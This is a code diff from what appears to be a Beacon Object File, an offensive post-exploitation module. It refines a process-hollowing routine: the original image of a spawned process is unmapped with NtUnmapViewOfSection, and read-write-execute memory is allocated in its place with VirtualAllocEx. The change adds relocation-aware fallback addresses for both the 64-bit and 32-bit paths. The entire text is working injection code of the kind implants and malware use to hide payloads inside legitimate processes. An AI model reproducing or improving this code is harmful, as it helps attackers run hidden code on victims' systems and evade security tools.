@@ -699,11 +699,21 @@ void go(char *rawArgs, int rawLen) {
 
             NTDLL$NtUnmapViewOfSection(sctx.pi.hProcess, (PVOID)origBase);
 
-            BYTE *pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
-                (PVOID)origBase, pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-            if (!pRemote)
+            BOOL hasRelocs = (pi2.relocDir.Size > 0 && pi2.relocDir.VirtualAddress > 0);
+            BYTE *pRemote = NULL;
+            if (hasRelocs) {
+                pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
+                    (PVOID)origBase, pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                if (!pRemote)
+                    pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
+                        (PVOID)pi2.imageBase, pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            } else {
                 pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
                     (PVOID)pi2.imageBase, pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                if (!pRemote)
+                    pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
+                        (PVOID)origBase, pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            }
             if (!pRemote)
                 pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess, NULL,
                     pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -760,14 +770,25 @@ void go(char *rawArgs, int rawLen) {
             /* Unmap original 32-bit image */
             NTDLL$NtUnmapViewOfSection(sctx.pi.hProcess, (PVOID)(ULONG_PTR)origBase32);
 
-            /* Allocate at origBase32 (32-bit address space, < 4GB) */
-            BYTE *pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
-                (PVOID)(ULONG_PTR)origBase32, pi2.sizeOfImage,
-                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-            if (!pRemote)
+            BOOL hasRelocs = (pi2.relocDir.Size > 0 && pi2.relocDir.VirtualAddress > 0);
+            BYTE *pRemote = NULL;
+            if (hasRelocs) {
+                pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
+                    (PVOID)(ULONG_PTR)origBase32, pi2.sizeOfImage,
+                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                if (!pRemote)
+                    pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
+                        (PVOID)pi2.imageBase, pi2.sizeOfImage,
+                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            } else {
                 pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
                     (PVOID)pi2.imageBase, pi2.sizeOfImage,
                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                if (!pRemote)
+                    pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess,
+                        (PVOID)(ULONG_PTR)origBase32, pi2.sizeOfImage,
+                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            }
             if (!pRemote)
                 pRemote = (BYTE*)KERNEL32$VirtualAllocEx(sctx.pi.hProcess, NULL,
                     pi2.sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
